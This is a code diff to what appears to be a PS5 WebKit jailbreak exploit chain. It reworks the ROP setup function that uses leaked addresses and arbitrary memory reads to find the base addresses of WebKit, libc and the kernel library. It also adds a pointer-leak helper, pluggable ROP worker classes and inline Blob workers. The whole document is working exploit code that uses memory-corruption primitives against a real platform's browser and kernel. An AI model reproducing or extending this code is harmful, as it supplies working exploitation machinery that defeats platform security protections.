@@ -107,32 +107,44 @@ function jbmark(tag, detail) {
   } catch (e) {}
 }
 
-async function prepareRop(p) {
-  const ctor = globalThis.__ps5NativeCtor;
-  let webkitBase;
-  if (typeof ctor === "number" && typeof OFFSET_wk_host_constructor_candidates !== "undefined") {
-    for (const offset of OFFSET_wk_host_constructor_candidates) {
-      const candidate = ctor - offset;
-      if (candidate >= 0x800000000 && candidate < 0x900000000 && candidate % 0x4000 === 0) {
-        webkitBase = candidate;
-        break;
+async function prepareRop(p, options = {}) {
+  let libSceNKWebKitBase = options.libSceNKWebKitBase;
+  let libSceLibcInternalBase = options.libSceLibcInternalBase;
+  let libKernelBase = options.libKernelBase;
+
+  // Poops on Wobkot already has these bases. Preserve the old derivation for
+  // the legacy entry point, but do not repeat it in the compatibility path.
+  if (!libSceNKWebKitBase) {
+    const ctor = globalThis.__ps5NativeCtor;
+    let webkitBase;
+    if (typeof ctor === "number" && typeof OFFSET_wk_host_constructor_candidates !== "undefined") {
+      for (const offset of OFFSET_wk_host_constructor_candidates) {
+        const candidate = ctor - offset;
+        if (candidate >= 0x800000000 && candidate < 0x900000000 && candidate % 0x4000 === 0) {
+          webkitBase = candidate;
+          break;
+        }
       }
     }
+    if (webkitBase === undefined)
+      throw new Error("no host-constructor candidate gave a valid base (ctor=0x" + String(ctor) + ")");
+    libSceNKWebKitBase = new int64(webkitBase % 0x100000000,
+      Math.floor(webkitBase / 0x100000000));
   }
-  if (webkitBase === undefined)
-    throw new Error("no host-constructor candidate gave a valid base (ctor=0x" + String(ctor) + ")");
-  const libSceNKWebKitBase = new int64(webkitBase % 0x100000000,
-    Math.floor(webkitBase / 0x100000000));
 
-  let libSceLibcInternalBase = p.read8(
-    libSceNKWebKitBase.add32(OFFSET_wk_memset_import),
-  );
-  libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);
+  if (!libSceLibcInternalBase) {
+    libSceLibcInternalBase = p.read8(
+      libSceNKWebKitBase.add32(OFFSET_wk_memset_import),
+    );
+    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);
+  }
 
-  let libKernelBase = p.read8(
-    libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import),
-  );
-  libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);
+  if (!libKernelBase) {
+    libKernelBase = p.read8(
+      libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import),
+    );
+    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);
+  }
 
   const gadgets = {};
   const syscalls = {};
@@ -146,16 +158,25 @@ async function prepareRop(p) {
 
   const allocations = [];
 
+  function allocationPointer(backing) {
+    let ptr;
+    if (backing.buffer && typeof backing.buffer.data === "function") {
+      const address = backing.buffer.data();
+      ptr = new int64(address.lo, address.hi);
+    } else {
+      ptr = p.read8(p.leakval(backing).add32(0x10));
+    }
+    ptr.backing = backing;
+    return ptr;
+  }
+
   function malloc(size, type = 4) {
     const backing =
       type === 1
         ? new Uint8Array(1000 + size)
         : new Uint32Array(0x10000 + size);
     allocations.push(backing);
-
-    const ptr = p.read8(p.leakval(backing).add32(0x10));
-    ptr.backing = backing;
-    return ptr;
+    return allocationPointer(backing);
   }
 
   function stringify(str) {
@@ -164,9 +185,8 @@ async function prepareRop(p) {
       bufView[i] = str.charCodeAt(i) & 0xff;
     }
 
-    const ptr = p.read8(p.leakval(bufView).add32(0x10));
-    ptr.backing = bufView;
-    return ptr;
+    allocations.push(bufView);
+    return allocationPointer(bufView);
   }
 
   function writestr(addr, str) {
@@ -383,13 +403,18 @@ async function prepareRop(p) {
     malloc,
     stringify,
     writestr,
+    libSceNKWebKitBase,
     libSceLibcInternalBase,
     libKernelBase,
     syscalls,
     gadgets,
   };
 
-  const chain = new worker_rop(runtime);
+  const WorkerRop = options.WorkerRop ||
+    (typeof worker_rop === "function" ? worker_rop : null);
+  if (!WorkerRop)
+    throw new Error("prepareRop needs a WorkerRop implementation");
+  const chain = new WorkerRop(runtime);
 
   const JB_POISON = new int64(0xdeadbeef, 0x00c0ffee);
 
@@ -408,7 +433,9 @@ async function prepareRop(p) {
   };
 
   p.write8(chain.return_value, JB_POISON);
-  const pid = await chain.syscall(SYS_GETPID);
+  // Do not depend on the retired src/utils/syscalls.js classic globals. The
+  // legacy firmware table already populated syscalls[0x14] above.
+  const pid = await chain.syscall(0x014);
   if (pid.low == 0) {
     throw new Error("WebKit exploit failed.");
   }
@@ -441,7 +468,15 @@ function verifySyscallNumbers(mod) {
 // Standalone builds supply a Blob worker through ropWorkerFactory.
 function makeRopWorker() {
   const factory = (typeof window !== "undefined" && window.ropWorkerFactory) || null;
-  if (!factory) return new Worker("./src/utils/rop_slave.js");
+  if (!factory) {
+    const inline = window.__wobkotScripts && window.__wobkotScripts["src/utils/rop_slave.js"];
+    if (typeof inline === "string") {
+      const url = URL.createObjectURL(new Blob([inline], { type: "text/javascript" }));
+      const worker = new Worker(url);
+      return worker;
+    }
+    return new Worker("./src/utils/rop_slave.js");
+  }
   const worker = factory();
   if (!worker || typeof worker.postMessage !== "function") {
     throw new Error(
